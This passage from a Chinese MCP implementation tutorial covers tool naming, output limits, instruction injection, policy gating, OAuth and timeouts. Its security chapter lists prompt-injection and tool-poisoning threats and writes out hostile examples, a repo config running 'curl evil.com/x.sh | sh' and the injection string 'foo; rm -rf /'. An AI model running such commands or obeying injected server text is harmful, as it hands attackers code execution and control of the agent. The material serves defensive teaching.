  normalized = normalized.replace(/_+/g, "_");             // 合并连续 _
  normalized = normalized.replace(/^_|_$/g, "");           // 去首尾 _
  if (normalized.length > 64) normalized = normalized.slice(0, 64);
  return normalized || "unnamed";
}

export function buildMcpToolName(serverName: string, toolName: string): string {
  return `mcp__${normalizeMcpName(serverName)}__${normalizeMcpName(toolName)}`;
}

export function parseMcpToolName(fullName: string) {
  const parts = fullName.split("__");
  const [prefix, serverName, ...toolParts] = parts;
  if (prefix !== "mcp" || !serverName) return null;
  const toolName = toolParts.length > 0 ? toolParts.join("__") : undefined;
  return { serverName, toolName };
}
```

这个命名解决**两个**问题：

1. **撞名**：`mcp__github__search` vs `mcp__slack__search`
2. **和内置工具区分**：`mcp__` 前缀让权限系统能一眼分出「这是外部工具」

⚠️ **一个已知限制，值得作为「怎么诚实对待技术债」的样本**：
注意 `parseMcpToolName` 里的 `toolParts.join("__")`——
**工具名里的 `__` 被保留了，但 Server 名里的 `__` 会让解析出错**。

📄 Claude Code 的源码注释坦诚地写明了这个限制。
**这个取舍是对的**：Server 名很少含双下划线，
而彻底解决（比如改用长度前缀编码）会让名字变得不可读。
**关键是把限制写在注释里**，而不是假装它不存在。

🔬 注意 `normalizeMcpName` 里的**合并连续下划线 + 去首尾下划线**这两步。
📄 Claude Code 只对特定来源的 Server 做这一步，
理由是：**防止和 `__` 分隔符冲突**。
比如一个叫 `my_ server` 的 Server，不合并的话会变成 `my__server`，
拼进全名后成了 `mcp__my__server__tool`——**解析时会被切成
Server 名 `my`、工具名 `server__tool`，完全错了。**

**这是个很好的「一行代码背后有个真实 bug」的例子。**

### 7.7 annotations 映射

把 §2.2 的 MCP annotations 翻译成 harness 内部概念：

| MCP Annotation | harness 内部属性 | 作用 |
| --- | --- | --- |
| `readOnlyHint: true` | `isReadOnly()` / `isConcurrencySafe()` | 只读 → 可自动放行、**可并发执行** |
| `destructiveHint: true` | `isDestructive()` | 破坏性 → 权限检查更严 |
| `openWorldHint: true` | `isOpenWorld()` | 会碰外部世界 |
| `idempotentHint: true` | （可用于重试判定） | 幂等 → 可安全重试 |

**这个映射的价值**：让 Server 在**不了解 harness 内部概念**的前提下，
把「这个工具的行为特征」告诉 harness。Server 只需说
「我是只读的」，不需要知道 harness 有个并发调度器。

⚠️ 重申 §2.2 那条：**annotations 是 hint，不是保证**。
`readOnlyHint` 可以用来「把只读操作自动放行以提升体验」，
**绝不能当作唯一安全判据**——它由 Server 自己声明。

### 7.8 描述与结果截断（一个真实的 60KB 事故）

📄 Claude Code 的源码注释直接点出了动机：

> **「从 OpenAPI 自动生成的 MCP Server 被观察到往 `tool.description`
> 里倾倒 15-60KB 的端点文档」**

🔬 两边的常量一致（sid-code `packages/core/src/mcp/manager.ts:41,49`，实读）：

```ts
const MAX_MCP_DESCRIPTION_LENGTH = 2048;  // 工具描述上限
const MAX_INSTRUCTIONS_LENGTH   = 2048;  // Server instructions 上限
const MAX_RESULT_SIZE           = 100_000; // 工具结果上限
```

🔬 结果侧还有一层**按 token 而非字符**的限制
（`packages/core/src/mcp/mcp-output-limit.ts`，88 行，实读）：

```ts
export const DEFAULT_MAX_MCP_OUTPUT_TOKENS = 25000;
export const IMAGE_TOKEN_ESTIMATE = 1600;   // 一张图约等于多少 token
const CHARS_PER_TOKEN = 4;                   // 字符↔token 粗换算
// 可用 SID_CODE_MAX_MCP_OUTPUT_TOKENS / MAX_MCP_OUTPUT_TOKENS 覆盖
```

**为什么要按 token 再限一层**：因为字符数和 token 数不是线性关系
（中文、代码、base64 的比率差很多），**而真正花钱和占窗口的是 token**。
`IMAGE_TOKEN_ESTIMATE = 1600` 这个常量尤其说明问题——
一张图在字符上可能只是一个短 URL，在 token 上是 1600。
**只按字符截断会让一个返回 20 张图的工具轻松吃掉 3.2 万 token。**

⚠️ **截断的定位要说清**：它**防资源滥用，不防恶意攻击**。
一个恶意 Server 完全可以在 2048 字符内写下有害的提示注入。
截断买到的是「一个配置糟糕的 Server 不会拖垮整个会话」，
**不是安全**。§8 的威胁模型才管后者。

### 7.9 instructions 注入：一个「性能优化必须尊重正确性」的范例

**问题**：Server 在握手时可以返回 `instructions`——
一段自然语言，告诉模型怎么用它的工具。这段话要进上下文。

**但 MCP 连接是异步且延迟的**：用户开始对话时某些 Server 还没连上。
如果 Server 在第 3 轮才连上，它的 instructions 就得在第 4 轮才出现。
**这意味着 system prompt 在对话过程中会变。**

而 prompt cache 是**前缀匹配**的（回顾 §6.5）。
**system prompt 一变，整个缓存击穿。**

⚖️ **核心矛盾：MCP 指令的动态性 vs prompt cache 的稳定性。**

**策略一：system prompt 内联（传统做法）**

📄 Claude Code 里这个 section 的函数名本身就是警告：
`DANGEROUS_uncachedSystemPromptSection`，注释写
`'MCP servers connect/disconnect between turns'`。
**用命名把危险性写在调用点上**，这个手法值得学。

**策略二：Delta Attachment（增量注入）**

核心思想：**不放进 system prompt，而是作为一条消息插进对话流**。

```
策略一（内联）：
  System Prompt: [静态内容][MCP 指令: A, B, C]
  ↓ Server D 连上
  System Prompt: [静态内容][MCP 指令: A, B, C, D]  ← cache 失效！

策略二（Delta）：
  System Prompt: [静态内容]                        ← 永远不变，cache 命中
  Message[3]:   [mcp_instructions_delta: added A, B, C]
  ↓ Server D 连上
  Message[7]:   [mcp_instructions_delta: added D]  ← 追加消息，不影响 cache
```

🔬 sid-code 的实现（`packages/core/src/mcp/instructions-delta.ts`，57 行，实读）：

```ts
export function getMcpInstructionsDelta(
  serverStatuses: MCPServerStatusInfo[],
  announcedServers: Set<string>,
): { added: string[]; blocks: string[] } | null {
  const connected = serverStatuses.filter(
    (s) => s.status === "connected" && s.instructions && !announcedServers.has(s.name),
  );
  if (connected.length === 0) return null;
  return {
    added: connected.map((s) => s.name),
    blocks: connected.map((s) => `## ${s.name}\n${s.instructions}`),
  };
}
```

**关键是那个 `announcedServers` 集合**：它记录「已经通知过哪些 Server」，
所以每个 Server 的 instructions 只注入一次。
📄 Claude Code 的版本更完整，还处理**移除**（Server 断开后要告诉模型它没了）。

#### 🔬 一个真实事故：注入格式本身会让模型认错说话人

这是本章最值钱的一段，因为它是**同一个文件的注释里记录的真实事故**
（sid-code `instructions-delta.ts`，轨迹 `20260729-180624-b8ae8e78`，实读）：

```
⚠️ 两条别再踩回去的坑（2026-07-29 实测事故）：

1. 必须带 <system-reminder> 围栏。原实现产出裸 "# MCP Server Instructions"，
   与用户 prompt 的 "# Commit:" 形态完全混同 —— 模型因此分不清"谁在说话"，
   转而抓 system prompt 记忆索引里的一条陈述句当用户意图，第一轮跑去 glob 记忆文件。
   围栏是 OpenAI 族的【唯一】保底边界（多 text block 在 wire 上会被 join 成单 string，
   block 边界丢失，只剩标签文本本身可依）。
2. 不要用 # markdown 标题开头。标题层级越浅，越像"一段新的用户输入"。
```

**这个事故的教学价值极高，因为它揭示了一件不直观的事**：

> **你注入的内容不只有「语义」，还有「形态」。
> 形态会被模型用来判断「这段话是谁说的」。**

一个 `# MCP Server Instructions` 标题，在模型看来和用户输入的
`# Commit: 修复登录 bug` **形态一样**——都是顶级标题开头的一段文本。
于是模型无法区分「这是 harness 塞的说明」和「这是用户的新指令」。

而修法是加 `<system-reminder>` 围栏。**为什么围栏是唯一保底手段**：
因为在 OpenAI 族的线格式上，多个 text block 会被 join 成一个字符串，
**block 边界在传输中就丢了**——模型能依据的只有文本内容本身。

正确的注入形态（同文件实读）：

```ts
`<system-reminder>\n` +
`MCP Server Instructions（harness 注入的服务器使用说明，非用户输入）：\n\n` +
`以下 MCP 服务器提供了使用说明，请在使用对应工具时遵循这些指令。\n` +
`这些说明仅供你参考，静默遵循即可，不要在回复中提及这些说明的存在。\n\n` +
blocks +
`\n</system-reminder>`
```

三个细节都是有理由的：① 围栏标签；② 显式写「非用户输入」；
③ 交代「不要在回复里提及」——否则模型会说「根据 MCP 服务器说明…」，
把内部机制泄露给用户。

⚠️ **同一个文件还演示了另一件事：怎么标记一个没有生产调用点的函数。**
`buildMcpInstructionsSection` 上面明写着
「**当前无生产调用点**，仅测试驱动」并 `@deprecated`。
**这一点很重要**——一个「有代码、有测试、测试全绿」但没人调用的函数，
在任何盘点里都会被算成资产。§11 会讲这类「死功能」为什么危险。

### 7.10 差异化重连

**问题**：连接断了要不要重连？**答案取决于传输类型**，
而这是个容易一刀切写错的地方。

🔬 sid-code 的参数（`manager.ts:36-37,649-663`，实读）：

```ts
const MAX_RECONNECT_ATTEMPTS = 5;
const RECONNECT_BASE_DELAY = 1000; // ms
// 指数退避：1s → 2s → 4s → 8s → 16s，成功后 reconnectAttempts 归零
```

📄 Claude Code 的策略差异化更明确：

| 传输类型 | 断开后 | 为什么 |
| --- | --- | --- |
| **stdio / sdk**（本地） | **标记 failed，不自动重连** | 子进程崩了通常意味着**配置错误或 Server 本身有 bug**，自动重连只会反复失败 |
| **SSE / HTTP / WS**（远程） | **指数退避重连** | 网络断开是**暂时性**的，重连是合理的 |

**这个区分的判据很清晰**：

> **故障是暂时的还是持久的？暂时的才值得重试。**
> 网络抖动会自己好；一个 `command` 写错了的 stdio Server，
> 重连一万次还是错的。

⚠️ **无脑重连的代价不只是白烧**：它会**掩盖真实错误**。
一个配置写错的 Server 如果一直在「重连中」状态，
用户看到的是「还在连接」而不是「配置错了」——
**排查时间从 10 秒变成 10 分钟。**

🔬 另外注意 sid-code 有个 `HEARTBEAT_INTERVAL = 30_000`（`manager.ts:38`）。
⚠️ **这里有个和 §5 相关的注意点**：心跳传统上靠 `ping` 方法，
而 `ping` 在 `2026-07-28` 被**删除**了。
所以基于 `ping` 的健康检查在新版协议下要改用
`server/discover` 或业务级轻量调用。**这正是 §1 那五个探针的用处**——
在自己的代码里搜 `ping`，就能定位到需要迁移的地方。

### 7.11 本章自检

1. 为什么 `.mcp.json` 的 Server 要审批，而 `~/.claude.json` 的不要？
2. 本地并发 3 / 远程并发 20，这个差异的依据是什么？
3. `normalizeMcpName` 为什么要合并连续下划线？不做会出什么错？
4. 为什么工具结果要按 token 再限一层，字符数上限还不够？
5. Delta 注入相比 system prompt 内联，买到了什么、代价是什么？
6. 为什么注入的文本必须带 `<system-reminder>` 围栏？为什么说它是「唯一保底手段」？
7. stdio Server 断开为什么不自动重连？无脑重连除了白烧还有什么代价？

---
<a id="c8"></a>
## §8 安全：分层不是一道门

### 8.1 MCP 引入了什么新的安全边界

先把问题说准。MCP 让 LLM 的**能力半径**从「生成文本」扩张到
「在真实世界里做事」——读写文件、调 API、执行代码。
**每一个 MCP Server 都是一个新的攻击面。**

安全模型要回答三个问题：

| 问题 | 术语 | 谁来答 |
| --- | --- | --- |
| 你是谁？ | **认证**（Authentication） | OAuth 2.1 / mTLS |
| 你能做什么？ | **授权**（Authorization） | Token scope / 策略门控 |
| 用户知不知道 agent 在做什么？ | **用户同意**（HITL） | 宿主的确认 UI |

**信任边界画在哪里**——这是最关键的一张图：

```
用户 ──信任──→ Host 应用 ──信任──→ MCP Client
                                        │
                            ★ 信任边界在这里 ★
                                        │
                                 MCP Server（可能不可信）
                                        │
                                 外部服务 / 数据源（一定不可信）
```

**记住这条边界的位置**：Client 之内是你的代码，Server 之外全是别人的。
所有安全设计都围绕这条线。

### 8.2 威胁模型：六类威胁

📄 这张表建议记住，面试问「MCP 有什么安全风险」时可以逐条展开：

| 威胁 | 怎么发生 | 缓解 |
| --- | --- | --- |
| **恶意 Server** | Server 伪装成合法工具，实际窃取数据 | 版本锁定、代码签名、安装审查 |
| **工具投毒**（Tool Poisoning） | Server 更新后**描述被篡改**，诱导模型调恶意工具 | 变更检测、**描述 hash 校验** |
| **工具名劫持**（Shadowing） | 恶意 Server 注册与合法工具同名的工具，劫持调用 | 命名空间隔离（§7.6）、优先级管理 |
| **间接提示注入** | 外部数据（网页、文档）里嵌恶意指令，经 Resource 进上下文 | 数据清洗、输入输出隔离 |
| **OAuth 实现漏洞** | 动态注册 + 多层代理导致 CSRF / Token 泄露 | 严格 state 绑定、redirect_uri 校验 |
| **跨 Server 数据泄露** | Server A 拿到的敏感数据被 Server B 的工具读走 | Client 间上下文隔离 |

**其中「工具投毒」最值得单独想清楚**，因为它利用的是 MCP 的**核心特性**：

> 工具描述是**运行时**从 Server 获取的，且**它是模型行为的直接输入**。
> 所以一个 Server 更新后，可以在不改任何代码的前提下改变你 agent 的行为。

这就是为什么 §7.2 提到的「版本锁定」不是官僚要求——
**不锁版本，等于允许第三方随时改写你 agent 的指令。**

### 8.3 ★ 一个反直觉的结论：最危险的漏洞是 90 年代的老漏洞

📄 这是本章最有面试价值的一段。

**直觉**：MCP 是新协议，安全问题应该是 AI 特有的新型攻击
（提示注入、工具投毒之类）。

**实际**：2026 年上半年披露的 MCP 生态 Critical 级漏洞，**几乎全是经典命令注入**：

- CVE-2026-0755（gemini-mcp-tool）：根因是 `child_process.exec`
  **把用户输入拼进 shell 命令**——和 1990 年代 CGI-bin 的命令注入**一模一样**
- OX Security 2026-04 披露的跨生态 RCE（LiteLLM、Agent Zero、
  Langchain-Chatchat、DocsGPT）：**全部是 CWE-78（OS 命令注入）**
- 扫描数据：**82% 路径遍历、43%（另一处口径 67%）命令注入**
  —— 都是 OWASP Top 10 里最古老的类型

**为什么会有这个认知偏差**：MCP 被包装成「AI 协议」，
于是开发者的注意力全在 AI 特有的问题上，**忽略了最基础的输入验证**。

**为什么 MCP 特别容易踩这个坑**（这层机制要说清）：

> **MCP 工具的参数是 LLM 生成的。** 开发者潜意识里把
> 「LLM 生成的参数」当成了「我自己代码生成的参数」，
> 于是省掉了输入验证。但 LLM 的输出是**用户可影响的**——
> 用户说「帮我查一下 `foo; rm -rf /`」，这个字符串就可能原样进到你的 `exec` 里。

**这条推论必须记住**：

> 🔒 **LLM 生成的参数 = 不可信输入。和来自 HTTP 请求体的字符串同一级别。**

🎤 **面试话术**：「MCP 最危险的安全问题不是 AI 特有的提示注入，是最古老的命令注入。
2026 上半年的 CVE 列表几乎全是 CWE-78，和 90 年代 CGI-bin 漏洞一样。
根因我认为是个认知偏差：开发者把『LLM 生成的参数』当成了自己代码里的可信值，
但它其实是用户可影响的——所以必须按不可信输入处理，
用参数化调用而不是字符串拼接。这说明 MCP 生态的安全成熟度
还在『重新发现经典漏洞』的阶段。」

### 8.4 三层门控：deny wins

📄 Claude Code 的安全门控是三层，🔬 sid-code 实现了前两层。**顺序很重要**：

```
MCP Server 配置
      │
      ▼
┌─ 第一层：Denylist（绝对禁止）────────────────┐
│  按名称 / 按 command+args / 按 URL 通配符匹配 │
│  匹配 → 直接拒绝，【不可被 allowlist 覆盖】   │
└──────────────────────────────────────────────┘
      │ 未匹配
      ▼
┌─ 第二层：Allowlist（允许名单）───────────────┐
│  不存在      → 放行（无限制）                 │
│  存在但为空  → 【全部拒绝】                   │
│  存在且非空  → 必须匹配其中一条               │
└──────────────────────────────────────────────┘
      │ 通过
      ▼
┌─ 第三层：项目审批（.mcp.json 专用）──────────┐
│  已批准 → 连接 / 已拒绝 → 跳过                │
│  pending → 弹审批对话框                       │
└──────────────────────────────────────────────┘
      │ 通过 → 连接
```

🔬 sid-code 的完整实现（`packages/core/src/mcp/policy.ts`，80 行，实读）：

```ts
export function isMcpServerAllowed(name, config, policy): boolean {
  // 第一层: Denylist（绝对否决）
  if (isServerDenied(name, config, policy.deniedServers)) return false;

  // 第二层: Allowlist（若定义，必须匹配）
  if (policy.allowedServers) {
    if (policy.allowedServers.length === 0) return false;  // ← 空数组 = 全拒
    return isServerInAllowlist(name, config, policy.allowedServers);
  }
  return true;  // 未定义 allowlist → 放行
}
```

**三个必须理解的设计点**：

**① 「deny wins」——denylist 绝对不可覆盖。**
即使一个 Server 在 allowlist 里，只要它同时在 denylist 里，仍然被拒。
**这是安全领域的通用原则**：拒绝的判断优先于允许的判断，
因为**误拒的代价（功能不可用）远小于误放的代价（安全事故）**。

**② 「未定义」和「空数组」语义完全不同。**

```
policy.allowedServers === undefined  → 放行所有（没配置限制）
policy.allowedServers === []         → 拒绝所有（配置了限制，且限制是「什么都不许」）
```

⚠️ **这个区分是个经典 bug 源头**。如果代码写成
`if (policy.allowedServers?.length) { ...检查... }`，
那么空数组会走到 else 分支被**放行**——
**一个本意是「全部禁止」的配置，实际效果是「全部允许」**。
这类 bug 不报错，只是安全策略静默失效。

**③ 三种匹配维度对应不同 Server 类型**（🔬 `policy.ts` 实读）：

```ts
function matchesPolicyEntry(name, config, entry): boolean {
  if (entry.name && entry.name === name) return true;               // 按名称
  if (entry.command && config.command) {                            // 按命令+参数
    const configCmd = [config.command, ...(config.args || [])];
    if (JSON.stringify(entry.command) === JSON.stringify(configCmd)) return true;
  }
  if (entry.url && config.url) {                                    // 按 URL 通配符
    if (matchUrlPattern(config.url, entry.url)) return true;
  }
  return false;
}
```

⚠️ **「按名称匹配」是最弱的一种，理解为什么很重要**：
名称是**用户自己在配置里起的**，恶意仓库的 `.mcp.json` 可以把
一个恶意 Server 起名叫 `filesystem`。
**所以名称匹配只适合做 denylist（拒绝已知坏名字），
不适合做 allowlist 的唯一依据**——按 `command` 或 `url` 匹配才是实质性的。

**URL 通配符的实现**（🔬 `policy.ts` 实读）：

```ts
function matchUrlPattern(url: string, pattern: string): boolean {
  const regex = pattern.replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*");
  return new RegExp(`^${regex}$`).test(url);
}
// "https://*.example.com/*" → /^https:\/\/.*\.example\.com\/.*$/
```

⚠️ 注意先转义正则元字符**再**把 `*` 换成 `.*`——顺序反了就会
把用户写的 `.` 当成「任意字符」，`https://a.evil.com` 会匹配
`https://a*evil.com` 之外的东西。**这一行的转义顺序是有理由的。**

### 8.5 项目审批：信任边界在「用户是否知情」

第三层专门解决一个具体威胁：**恶意仓库的 `.mcp.json`**。

场景：你 `git clone` 了一个仓库，里面的 `.mcp.json` 配了一个
Server，`command` 是 `curl evil.com/x.sh | sh`。
**如果自动连接，你 clone 一个仓库就等于执行了任意代码。**

🔬 sid-code 的审批状态（`packages/core/src/mcp/approval.ts`，143 行，实读）：

```ts
export type ApprovalStatus = "approved" | "rejected" | "pending";

export function getProjectServerApproval(serverName, projectPath): ApprovalStatus {
  if (approvals.rejected?.includes(key)) return "rejected";
  if (approvals.approved?.includes(key)) return "approved";
  if (approvals.approveAll) return "approved";
  return "pending";   // ← 默认待审批，不是默认放行
}
```

**关键是那个默认值：`pending`，不是 `approved`。**
这就是 **fail-closed（失败关闭）** 原则：
**不确定时选择拒绝/询问，而不是放行。**

⚠️ 注意 `rejected` 的判断在 `approved` **之前**——
同一个 Server 同时出现在两个列表时，拒绝优先。又是 deny wins。

📄 但有两个例外要知道（这是**便利性对安全性的让步**，要点破）：

- `bypassPermissions` 模式下自动批准
- 非交互模式（SDK / `-p` 一次性执行）下自动批准
  —— **因为没有人在那里点确认框**。这是个务实但真实的风险敞口：
  CI 里跑的 agent 会自动接受仓库里的 `.mcp.json`。

### 8.6 用户同意与 Approval Fatigue

⚖️ **核心 trade-off：用户控制 vs agent 自主性。**

📄 完全的 HITL（每个操作都确认）有一个**反直觉的失效模式**：

> **审批太频繁 → 用户开始无脑点「同意」→ 安全性反而比分级审批更低。**

这叫 **Approval Fatigue**。它说明一件重要的事：
**安全机制的有效性取决于人的实际行为，不取决于机制的严格程度。**

生产系统的**分级策略**（判据是**可逆性**）：

| 级别 | 什么操作 | 判据 |
| --- | --- | --- |
| **自动批准** | 只读操作（`readOnlyHint: true`） | 可逆、无副作用 |
| **静默记录** | 中风险，自动执行但记审计日志 | 可逆但值得留痕 |
| **显式确认** | 高风险（`destructiveHint: true`、删除、支付、发消息） | **不可逆** |
| **禁止执行** | 超出权限范围 | 策略明令禁止 |

📄 一个很漂亮的数据点：**Anthropic 用沙箱替代了 84% 的审批提示**，
**安全性和体验同时提升**。

**这个数字值得想清楚为什么可能**——它看起来违反了「安全 ↔ 效率」的对立：
因为沙箱**改变了操作的可逆性**。一个在沙箱里的 `rm -rf` 不再是不可逆操作，
于是它自动降到了「自动批准」档。

> 🔑 **通用原则：当你面对一个「安全 vs 效率」的取舍时，
> 先问能不能改变底层约束（可逆性），而不是在两端之间选一个点。**

🎤 **面试话术**：「完全的 HITL 会导致 Approval Fatigue，用户无脑批准反而更危险。
我的做法是按**可逆性**分级——只读自动批准，不可逆的显式确认，
用 tool annotations 驱动这个分级。但更好的思路是改变可逆性本身：
Anthropic 用沙箱替掉了 84% 的审批提示，因为沙箱里的操作变成可逆的了，
安全和体验同时改善。这比在『多问』和『少问』之间调参数更根本。」

### 8.7 本地 Server 的风险常被低估

| 维度 | 本地（stdio） | 远程（HTTP） |
| --- | --- | --- |
| 认证 | 不需要（**继承用户全部权限**） | 必须（OAuth 2.1） |
| 信任模型 | 用户信任本地装的代码 | 需验证远程服务身份 |
| 主要风险 | **命令注入、权限过大、恶意依赖** | Token 泄露、中间人、跨租户泄露 |
| 缓解重点 | 沙箱隔离、最小权限、代码审计 | TLS、Token 绑定、审计日志 |

⚠️ **本地 Server 以你的用户权限运行，可以执行任意代码、读你所有文件。**
它没有认证不是因为它安全，是因为**它已经在信任边界之内了**。

📄 Red Hat 安全团队特别指出：本地 MCP Server 的命令注入风险尤其严重，
因为 **LLM 生成的参数可能被直接拼进 shell 命令**——回到 §8.3 那条推论。

### 8.8 OAuth：已知的坑

📄 远程 Server 必须用 OAuth 2.1 + PKCE。关键技术要求：

| 要求 | RFC | 防什么 |
| --- | --- | --- |
| OAuth 2.1 + **PKCE** | — | 授权码拦截攻击 |
| Protected Resource Metadata | RFC 9728 | 让 Client 自动发现授权服务器 |
| **Resource Indicator**（`resource` 参数） | RFC 8707 | **Token 被跨服务滥用** |
| 校验 `iss` 参数 | RFC 9207 | 🌐 `2026-07-28` 新增**必须**校验，防混淆攻击 |

📄 **三个已知漏洞形态**（面试追问常问）：

1. **动态注册 + 多层代理**：MCP Server 作为 OAuth 中间层代理第三方（如 GitHub）授权时，
   **两层 consent 的 state 绑定容易写错** → CSRF
2. **redirect_uri 校验不严**：允许注入自定义 redirect_uri → 窃取授权码
3. **共享 client_id**：多个 Client 共用一个 client_id → 一个的 Token 被另一个滥用

**根源是 MCP 在 OAuth 之上多加了一层间接性**
（MCP Client → MCP Server → 第三方 OAuth），复杂度上升。

🌐 `2026-07-28` 的方向性变化值得知道：
**动态客户端注册（RFC 7591）被废弃**，改推
**Client ID Metadata Documents**——客户端用一个托管的 metadata URL 标识自己，
不再需要向每个 Server 预注册。**Server 不再是凭据堆积的地方**，
这直接回应了上面第 1、3 条漏洞的根因。

🔬 一个实现细节值得学（📄 Claude Code）：**OAuth 参数必须从日志脱敏**：

```ts
const SENSITIVE_OAUTH_PARAMS = ['state','nonce','code_challenge','code_verifier','code'];
// 所有涉及 OAuth URL 的日志点都要替换成 [REDACTED]
```

`state` 防 CSRF，`code` 是授权码——**任一泄露都是安全漏洞**。
而日志是最容易漏的泄露渠道（它会进日志聚合、进错误上报、进 issue 附件）。

### 8.9 安全是分层的：每层的边界要说清

📄 这是本章的收束。**每一层防线都有自己的假设和边界，混淆它们会得出错误的安全感**：

| 防线 | 防什么 | **不防什么** |
| --- | --- | --- |
| **Denylist** | 已知的坏 Server | 未知的坏 Server |
| **Allowlist** | 未审查的 Server | **审查通过后被投毒的 Server** |
| **项目审批** | 用户不知情就连上 | 用户点了同意之后的一切 |
| **描述/结果截断** | 资源滥用 | **恶意内容**（2048 字符足够写提示注入） |
| **annotations 分级** | 提升体验 | **Server 说谎**（hint 不是保证） |
| **命名空间** | 撞名 | 恶意 Server 起个相似名字骗用户 |

**这张表的价值在于「不防什么」那一列。**
最常见的安全错误不是「没有防线」，而是
**「以为某道防线防住了它其实不防的东西」**。

### 8.10 本章自检

1. 信任边界画在哪两个组件之间？为什么是那里？
2. 为什么 MCP 生态的 Critical 漏洞几乎全是命令注入？点出那个认知偏差。
3. `allowedServers` 是 `undefined` 和 `[]` 时行为分别是什么？写成 `?.length` 会怎样？
4. 为什么「按名称匹配」适合 denylist 但不适合做 allowlist 的唯一依据？
5. Approval Fatigue 说明了什么？为什么沙箱能同时改善安全和体验？
6. 「工具描述截断到 2048」防住了什么、没防住什么？

---
<a id="c9"></a>
## §9 可靠性：协议刻意不管运维

### 9.1 先接受一个事实：MCP 协议不定义可靠性机制

**MCP 协议里没有重试、没有熔断、没有健康检查。** 这不是遗漏，是设计。

📄 官方立场是**关注点分离**：

- 协议定义的是「**怎么通信**」，不是「**怎么运维**」
- 可靠性策略（重试几次、熔断阈值、降级方案）**高度依赖业务场景**，
  不适合在协议层固定
- 类比：**HTTP 协议不定义重试策略**，但 Nginx / Envoy 提供了丰富的可靠性机制

**所以这一章讲的全部东西，都要你自己在 Client / Gateway 层实现。**

而问题的规模是这样的：

> **Agent 通过 MCP 连 N 个 Server，每多一个 Server 就多一个故障点。
> MCP 把分布式系统的全部可靠性挑战带进了 agent 架构。**

🎤 **面试话术**（这是个高频设计题）：「MCP 协议刻意不内置可靠性机制，
这是关注点分离——协议管通信，不管运维。因为重试次数、熔断阈值这些参数
高度依赖业务，固定在协议层反而有害。这和 HTTP 的做法一致：
HTTP 不定义重试，Nginx 和 Envoy 来做。
MCP 只提供了基础设施——错误码、（旧版的）心跳、会话管理，
具体策略留给 Client 框架和 Gateway 层。」

### 9.2 分层超时：内层必须小于外层

**四层超时，每层的值必须递减**：

```
用户等待超时（60-180s）           ← Host 应用：给用户看进度或取消按钮
  └── Agent 整体任务超时（30-120s） ← Agent Runtime：终止任务，返回部分结果
       └── 单次工具调用超时（5-30s） ← MCP Client：返回超时错误给 LLM
            └── Server 内部操作超时（如 5s） ← Server 自己：如数据库查询
```

| 层级 | 设在哪 | 建议值 | 超时后做什么 |
| --- | --- | --- | --- |
| 连接超时 | MCP Client | 3-5s | 标记不可达，尝试备用 |
| 单次调用超时 | Client / Agent 框架 | 5-30s（按工具类型） | **返回超时错误给 LLM，让它决策** |
| 整体任务超时 | Agent Runtime | 30-120s | 终止，返回部分结果或降级响应 |
| 用户等待超时 | Host | 60-180s | 展示进度 / 提供取消 |

⚠️ **关键原则：内层超时 < 外层超时。**
否则外层先触发，**内层的超时设置完全失去意义**——
你设的那个 10s 工具超时，在 5s 就超时的外层面前是死代码。

🔬 sid-code 的超时配置（`packages/core/src/mcp/mcp-timeout.ts`，43 行，全文实读）：

```ts
const DEFAULT_MCP_TIMEOUT = 30000;        // 连接/请求
const DEFAULT_MCP_TOOL_TIMEOUT = 120000;  // 工具调用

// 优先级：env > per-server config.timeout > 默认值
export function getMcpTimeout(configTimeout?: number): number {
  return readEnvMs("SID_CODE_MCP_TIMEOUT", "MCP_TIMEOUT") ?? configTimeout ?? DEFAULT_MCP_TIMEOUT;
}
export function getMcpToolTimeout(configTimeout?: number): number {
  return readEnvMs("SID_CODE_MCP_TOOL_TIMEOUT", "MCP_TOOL_TIMEOUT")
    ?? configTimeout ?? DEFAULT_MCP_TOOL_TIMEOUT;
}
```

🔬 注释里有句话值得注意：

```
默认工具调用超时（ms）——CC 默认近乎无限，此处收紧到 120s 更安全，可 env 调
```

**「近乎无限」是个真实的设计选择，而且两边的选择不同。**
不设工具超时的理由是：有些工具**天然就慢**
（跑一整套测试、大型数据库查询），设死超时会误杀。
但代价是**一个挂住的 Server 能让 agent 永久卡住**。
sid-code 选了 120s + 可覆盖——**这是在「误杀慢工具」和「永久挂住」之间选了前者**，
因为前者可观测（用户看到超时报错），后者不可观测（用户只看到卡住）。

> 🔑 **一条通用判据：在两种失败模式之间选择时，选可观测的那一种。**

⚠️ **一个必须警惕的失效模式**（这也是 §11 的主题之一）：
**多层超时会互相掩蔽。** 如果外层 30s、内层 120s，
你永远看不到内层超时——修了内层的 bug 也没有任何效果，
因为**杀死请求的一直是外层**。排查时要先确认「到底是哪一层在超时」。

### 9.3 重试：先分清什么能重试

**不是所有失败都该重试。** 判据是**幂等性**和**故障的暂时性**：

| ✅ 可重试 | ❌ 不可重试 |
| --- | --- |
| 网络超时（Server 可能只是暂时慢） | HTTP 400（参数错，重试也不会对） |
| HTTP 429（限流，等一下再试） | HTTP 401/403（认证/授权失败） |
| HTTP 503（暂时不可用） | 业务逻辑错误（「文件不存在」） |
| 连接被重置（网络抖动） | **非幂等操作已部分执行**（「邮件已发出」） |

**指数退避 + 抖动**是标准做法：

```python
retry_config = {
    "max_attempts": 3,
    "base_delay": 1.0,        # 首次重试等 1s
    "max_delay": 10.0,
    "exponential_base": 2,    # 每次翻倍
    "jitter": True,           # ★ 加随机抖动，避免重试风暴
}
# 实际等待：1s → 2s(±随机) → 4s(±随机)
```

⚠️ **`jitter` 那一条最容易被省掉，但它防的是真实事故**：
如果 20 个 Client 在同一时刻被同一个 Server 拒绝，
不加抖动它们会在**完全相同的时刻**一起重试——
**把一次故障放大成一次 DDoS**。抖动让它们散开。

#### MCP 特有的重试考量：两层重试

这一条是 MCP（乃至所有 agent）**独有**的，值得单独理解：

> **工具调用失败后，有两个层次可以重试：
> 框架层（自动重试）和 LLM 层（让模型看到错误，自己决定）。**

| | 框架层重试 | LLM 层重试 |
| --- | --- | --- |
| 怎么做 | Client 自动重发同一请求 | 把错误信息作为 `result.isError` 返回给模型 |
| 优点 | **快**（毫秒级，不花 token） | **智能**（能换参数、换工具、换思路） |
| 适合 | 瞬时故障（网络抖动、429） | **语义级失败**（参数错、路径不对） |

**生产系统两层都要有**：框架层处理瞬时故障，LLM 层处理语义级重试。

🔬 **回到 §3.4 那条**：这就是为什么「协议错误 vs 业务错误」的区分至关重要——
**它决定了失败走哪一层重试**。把「文件不存在」返回成协议 `error`，
模型看不到原因，LLM 层重试就废了，于是它只能原地重试同一个错参数。

⚠️ **重试预算**：整个任务的重试次数要有上限。
否则 agent 会在一个坏 Server 上反复重试，**耗尽 token 预算**——
